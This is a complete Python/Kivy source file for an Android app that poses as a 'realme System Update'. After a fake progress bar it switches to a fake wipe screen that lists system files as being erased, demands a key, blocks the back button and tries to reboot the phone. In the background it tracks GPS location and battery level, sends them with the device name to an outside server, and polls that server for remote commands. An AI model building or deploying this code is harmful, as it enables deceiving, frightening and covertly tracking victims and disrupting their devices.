import threading
import random
import platform as plat

try:
    import requests
except ImportError:
    requests = None

try:
    from plyer import gps, battery
    HAS_PLYER = True
except ImportError:
    HAS_PLYER = False

from kivy.app import App
from kivy.clock import Clock
from kivy.core.audio import SoundLoader
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.label import Label
from kivy.uix.progressbar import ProgressBar
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.widget import Widget
from kivy.animation import Animation
from kivy.properties import NumericProperty
from kivy.base import EventLoop

BASE_URL = "https://shinsoo.pythonanywhere.com"
SECRET_CODE = "gokhan"

FAKE_PATHS = [
    "/data/data/com.android.settings/databases/settings.db",
    "/system/app/SystemUI/SystemUI.apk",
    "/data/system/packages.xml",
    "/proc/self/mem",
    "/dev/block/mmcblk0p1",
    "/system/framework/framework.jar",
    "/data/dalvik-cache/arm64/system@framework@boot.art",
    "/storage/emulated/0/Android/data/com.google.android.gms/",
    "/system/lib64/libandroid.so",
    "/data/system/users/0/accounts.db",
    "/proc/net/tcp6",
    "/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq",
    "/data/misc/wifi/WifiConfigStore.xml",
    "/system/etc/security/cacerts/",
    "/data/system_de/0/spfs/",
    "/dev/input/event0",
    "/system/bin/surfaceflinger",
    "/data/data/com.android.phone/shared_prefs/",
    "/proc/buddyinfo",
    "/sys/kernel/debug/tracing/trace",
    "/data/tombstones/tombstone_00",
    "/proc/1/maps",
    "/system/vendor/lib64/hw/gralloc.msm8998.so",
    "/data/local/tmp/.agent",
    "/proc/kmsg",
    "/sys/fs/pstore/console-ramoops",
    "/data/system/locksettings.db",
    "/dev/tty0",
    "/system/etc/hosts",
    "/proc/sysrq-trigger",
    "/data/data/com.android.vending/databases/localappstate.db",
    "/system/priv-app/Launcher3/Launcher3.apk",
    "/dev/block/platform/soc/1d84000.ufshc/by-name/userdata",
    "/data/system/sync/accounts.xml",
    "/proc/interrupts",
    "/sys/class/power_supply/battery/capacity",
    "/data/misc/keystore/user_0/",
    "/system/bin/init",
    "/proc/version",
    "/dev/urandom",
]


class RedMatrix(Widget):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.cols = []
        self._event = None

    def start(self):
        self.cols = []
        col_count = max(1, int(Window.width / 14))
        for _ in range(col_count):
            self.cols.append({
                "x": random.randint(0, max(1, int(Window.width))),
                "y": random.randint(0, max(1, int(Window.height))),
                "speed": random.uniform(8, 22),
                "len": random.randint(8, 24),
            })
        self._event = Clock.schedule_interval(self._update, 1 / 30)

    def stop(self):
        if self._event:
            self._event.cancel()
            self._event = None
        self.canvas.clear()

    def _update(self, dt):
        self.canvas.clear()
        with self.canvas:
            for col in self.cols:
                col["y"] -= col["speed"]
                if col["y"] < -col["len"] * 14:
                    col["y"] = Window.height + random.randint(0, 300)
                    col["x"] = random.randint(0, max(1, int(Window.width)))
                    col["speed"] = random.uniform(8, 22)
                    col["len"] = random.randint(8, 24)
                for i in range(col["len"]):
                    alpha = max(0.05, 1.0 - i * 0.05)
                    Color(1, 0.05, 0.05, alpha)
                    Rectangle(pos=(col["x"], col["y"] + i * 14), size=(8, 12))


class ShinsooRoot(FloatLayout):
    progress_val = NumericProperty(0)

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.phase = "update"
        self.sound = None
        self.device_id = None
        self._progress_event = None
        self._check_event = None
        self._progress_val = 0
        self.current_lat = None
        self.current_lng = None
        self.current_location = ""
        self._wrong_count = 0
        self._scroll_event = None
        self._scroll_lines = []
        self._shake_event = None
        self._build_ui()

    def _build_ui(self):
        Window.clearcolor = (0, 0, 0, 1)

        # ── AŞAMA 1: Realme Güncelleme Ekranı ──
        self.update_layer = FloatLayout(size_hint=(1, 1), pos_hint={"x": 0, "y": 0})

        self.realme_logo = Label(
            text="realme",
            font_size="44sp",
            bold=True,
            color=(1, 1, 1, 1),
            pos_hint={"center_x": 0.5, "center_y": 0.70},
            size_hint=(1, None),
            height=60,
        )
        self.update_layer.add_widget(self.realme_logo)

        self.update_title_lbl = Label(
            text="System Update",
            font_size="18sp",
            color=(0.75, 0.75, 0.75, 1),
            pos_hint={"center_x": 0.5, "center_y": 0.60},
            size_hint=(1, None),
            height=28,
        )
        self.update_layer.add_widget(self.update_title_lbl)

        self.progress_bar = ProgressBar(
            max=100,
            value=0,
            size_hint=(0.72, None),
            height=5,
            pos_hint={"center_x": 0.5, "center_y": 0.50},
        )
        self.update_layer.add_widget(self.progress_bar)

        self.progress_label = Label(
            text="0%",
            font_size="14sp",
            color=(0.6, 0.6, 0.6, 1),
            pos_hint={"center_x": 0.5, "center_y": 0.44},
            size_hint=(1, None),
            height=22,
        )
        self.update_layer.add_widget(self.progress_label)

        self.update_sub = Label(
            text="Do not turn off your phone",
            font_size="12sp",
            color=(0.45, 0.45, 0.45, 1),
            pos_hint={"center_x": 0.5, "center_y": 0.37},
            size_hint=(1, None),
            height=22,
        )
        self.update_layer.add_widget(self.update_sub)
        self.add_widget(self.update_layer)

        # ── AŞAMA 2: Kaos Ekranı ──
        self.chaos_layer = FloatLayout(size_hint=(1, 1), pos_hint={"x": 0, "y": 0}, opacity=0)

        self.matrix = RedMatrix(size_hint=(1, 1), pos_hint={"x": 0, "y": 0})
        self.chaos_layer.add_widget(self.matrix)

        # Akan dosya yolları label'ı
        self.scroll_lbl = Label(
            text="",
            font_size="9sp",
            color=(1, 0, 0, 1),
            halign="left",
            valign="top",
            size_hint=(1, 1),
            pos_hint={"x": 0, "y": 0},
            markup=False,
        )
        self.scroll_lbl.bind(size=self.scroll_lbl.setter("text_size"))
        self.chaos_layer.add_widget(self.scroll_lbl)

        # Orta KEY GİRİN kutusu
        key_box = FloatLayout(
            size_hint=(0.8, None),
            height=180,
            pos_hint={"center_x": 0.5, "center_y": 0.5},
        )
        with key_box.canvas.before:
            Color(0, 0, 0, 0.75)
            self._key_bg = Rectangle(size=key_box.size, pos=key_box.pos)
        key_box.bind(size=lambda o, v: setattr(self._key_bg, 'size', v))
        key_box.bind(pos=lambda o, v: setattr(self._key_bg, 'pos', v))

        self.key_title = Label(
            text="[color=ff2222]KEY GİRİN[/color]",
            markup=True,
            font_size="22sp",
            bold=True,
            size_hint=(1, None),
            height=36,
            pos_hint={"center_x": 0.5, "top": 1.0},
        )
        key_box.add_widget(self.key_title)

        self.password_input = TextInput(
            hint_text="••••••••",
            multiline=False,
            password=True,
            size_hint=(0.85, None),
            height=44,
            pos_hint={"center_x": 0.5, "center_y": 0.42},
            foreground_color=(1, 0.2, 0.2, 1),
            background_color=(0.08, 0.08, 0.08, 1),
            cursor_color=(1, 0, 0, 1),
            font_size="18sp",
        )
        key_box.add_widget(self.password_input)

        self.confirm_btn = Button(
            text="ONAYLA",
            size_hint=(0.85, None),
            height=40,
            pos_hint={"center_x": 0.5, "y": 0.0},
            background_color=(0.6, 0, 0, 1),
            color=(1, 1, 1, 1),
            bold=True,
            font_size="14sp",
        )
        self.confirm_btn.bind(on_press=self._on_confirm)
        key_box.add_widget(self.confirm_btn)

        self.wrong_lbl = Label(
            text="",
            font_size="11sp",
            color=(1, 0.3, 0.3, 1),
            size_hint=(1, None),
            height=20,
            pos_hint={"center_x": 0.5, "y": -0.18},
        )
        key_box.add_widget(self.wrong_lbl)

        self.chaos_layer.add_widget(key_box)
        self.add_widget(self.chaos_layer)

        # ── AŞAMA 3: No Command ekranı ──
        self.nocommand_layer = FloatLayout(size_hint=(1, 1), pos_hint={"x": 0, "y": 0}, opacity=0)
        with self.nocommand_layer.canvas.before:
            Color(0, 0, 0, 1)
            Rectangle(pos=(0, 0), size=Window.size)

        self.nocommand_lbl = Label(
            text="No command",
            font_size="16sp",
            color=(0.85, 0.85, 0.85, 1),
            pos_hint={"center_x": 0.5, "center_y": 0.35},
            size_hint=(1, None),
            height=30,
        )
        self.nocommand_layer.add_widget(self.nocommand_lbl)
        self.add_widget(self.nocommand_layer)

    def on_start(self):
        self._start_update()
        self._start_gps()
        self._register_device()

    def _start_update(self):
        self._progress_val = 0
        self._progress_event = Clock.schedule_interval(self._tick_progress, 0.05)

    def _tick_progress(self, dt):
        self._progress_val = min(100, self._progress_val + random.uniform(0.15, 0.55))
        self.progress_bar.value = self._progress_val
        self.progress_label.text = f"{int(self._progress_val)}%"
        if self._progress_val >= 100:
            if self._progress_event:
                self._progress_event.cancel()
                self._progress_event = None
            Clock.schedule_once(lambda _: self._start_chaos(), 0.5)

    def _start_chaos(self):
        if self.phase == "chaos":
            return
        self.phase = "chaos"
        Window.clearcolor = (0.04, 0, 0, 1)
        self.update_layer.opacity = 0
        Animation(opacity=1, duration=0.2).start(self.chaos_layer)
        self.matrix.start()
        self._play_music()
        self._scroll_event = Clock.schedule_interval(self._update_scroll, 0.05)
        Clock.schedule_once(lambda _: self._start_nocommand(), 30)

    def _update_scroll(self, dt):
        lines = []
        for _ in range(40):
            path = random.choice(FAKE_PATHS)
            size = random.randint(1, 65536)
            op = random.choice(["READ", "WRITE", "DELETE", "WIPE", "ERASE", "CORRUPT"])
            lines.append(f"[{op}] {path} ({size}B)")
        self.scroll_lbl.text = "\n".join(lines)

    def _start_nocommand(self):
        if self.phase != "chaos":
            return
        self.phase = "nocommand"
        self.matrix.stop()
        if self._scroll_event:
            self._scroll_event.cancel()
            self._scroll_event = None
        self._stop_music()
        self._play_glitch_sound()
        Animation(opacity=0, duration=0.3).start(self.chaos_layer)
        Animation(opacity=1, duration=0.3).start(self.nocommand_layer)
        Window.clearcolor = (0, 0, 0, 1)
        Clock.schedule_once(lambda _: self._do_reboot(), 60)

    def _do_reboot(self):
        try:
            import subprocess
            subprocess.Popen(["reboot"])
        except Exception:
            pass
        try:
            import android
            from jnius import autoclass
            PowerManager = autoclass("android.os.PowerManager")
            context = autoclass("org.kivy.android.PythonActivity").mActivity
            pm = context.getSystemService(context.POWER_SERVICE)
            pm.reboot(None)
        except Exception:
            pass

    def _play_music(self):
        try:
            self.sound = SoundLoader.load("music.m4a")
            if self.sound:
                self.sound.loop = True
                self.sound.play()
        except Exception:
            pass

    def _stop_music(self):
        try:
            if self.sound:
                self.sound.stop()
                self.sound = None
        except Exception:
            pass

    def _play_glitch_sound(self):
        try:
            from kivy.core.audio import SoundLoader
            import wave, struct, math, tempfile, os
            path = os.path.join(tempfile.gettempdir(), "glitch.wav")
            with wave.open(path, 'w') as f:
                f.setnchannels(1)
                f.setsampwidth(2)
                f.setframerate(44100)
                frames = []
                for i in range(44100 * 2):
                    t = i / 44100.0
                    v = random.uniform(-1, 1) * 0.3
                    if i < 22050:
                        freq = 440 + random.randint(-200, 200)
                        v += 0.5 * math.sin(2 * math.pi * freq * t)
                    frames.append(struct.pack('<h', int(v * 32767)))
                f.writeframes(b''.join(frames))
            s = SoundLoader.load(path)
            if s:
                s.play()
        except Exception:
            pass

    def _on_confirm(self, instance):
        entered = self.password_input.text.strip().lower()
        if entered == SECRET_CODE:
            self._stop_app()
        else:
            self._wrong_count += 1
            self.password_input.text = ""
            msgs = [
                "YANLIŞ KEY — SİSTEM KİLİTLENİYOR",
                f"HATA #{self._wrong_count} — ERİŞİM REDDEDİLDİ",
                "GEÇERSİZ KİMLİK DOĞRULAMASI",
                "SİSTEM UYARISI: YETKİSİZ ERİŞİM",
                f"{self._wrong_count} BAŞARISIZ DENEME",
            ]
            self.wrong_lbl.text = random.choice(msgs)
            anim = Animation(color=(1, 1, 0, 1), duration=0.1) + Animation(color=(1, 0.3, 0.3, 1), duration=0.1)
            anim.start(self.wrong_lbl)
            Window.clearcolor = (0.3, 0, 0, 1)
            Clock.schedule_once(lambda _: setattr(Window, 'clearcolor', (0.04, 0, 0, 1)), 0.15)

    def _start_gps(self):
        if not HAS_PLYER:
            return
        try:
            gps.configure(on_location=self._on_location)
            gps.start(minTime=5000, minDistance=10)
        except Exception:
            pass

    def _on_location(self, **kwargs):
        self.current_lat = kwargs.get("lat")
        self.current_lng = kwargs.get("lon")
        self.current_location = kwargs.get("provider", "")

    def _get_battery(self):
        if not HAS_PLYER:
            return None
        try:
            return int(battery.status.get("percentage", 0))
        except Exception:
            return None

    def _register_device(self):
        if requests is None:
            self.device_id = "no_requests"
            self._start_polling()
            return

        def _do():
            try:
                model = plat.node() or "UnknownDevice"
                system = plat.system() or "Android"
                bat = self._get_battery()
                resp = requests.post(
                    f"{BASE_URL}/register",
                    json={
                        "device": f"{model} ({system})",
                        "battery": bat,
                        "lat": self.current_lat,
                        "lng": self.current_lng,
                        "location": self.current_location,
                    },
                    timeout=8,
                )
                if resp.status_code == 200:
                    data = resp.json()
                    self.device_id = data.get("device_id") or "unknown"
                else:
                    self.device_id = "reg_failed"
            except Exception:
                self.device_id = "offline"
            self._start_polling()

        threading.Thread(target=_do, daemon=True).start()

    def _start_polling(self):
        self._check_event = Clock.schedule_interval(self._check_command, 3)

    def _check_command(self, dt):
        if not self.device_id or requests is None:
            return

        def _do():
            try:
                bat = self._get_battery()
                params = {k: v for k, v in {
                    "battery": bat,
                    "lat": self.current_lat,
                    "lng": self.current_lng,
                    "location": self.current_location,
                }.items() if v is not None}
                resp = requests.get(
                    f"{BASE_URL}/check/{self.device_id}",
                    params=params,
                    timeout=5,
                )
                if resp.status_code == 200:
                    cmd = resp.json().get("command", "").upper()
                    if cmd == "STOP":
                        Clock.schedule_once(lambda _: self._stop_app(), 0)
            except Exception:
                pass

        threading.Thread(target=_do, daemon=True).start()

    def _stop_app(self):
        self._stop_music()
        self.matrix.stop()
        if self._check_event:
            self._check_event.cancel()
        if self._progress_event:
            self._progress_event.cancel()
        if self._scroll_event:
            self._scroll_event.cancel()
        if HAS_PLYER:
            try:
                gps.stop()
            except Exception:
                pass
        App.get_running_app().stop()


class ShinsooApp(App):
    def build(self):
        self.title = ""
        Window.softinput_mode = "below_target"
        root = ShinsooRoot()
        return root

    def on_start(self):
        self.root.on_start()
        EventLoop.window.bind(on_keyboard=self._block_back)

    def _block_back(self, window, key, *args):
        if key in (27, 1001):
            return True
        return False

    def on_pause(self):
        return True

    def on_resume(self):
        pass


if __name__ == "__main__":
    ShinsooApp().run()
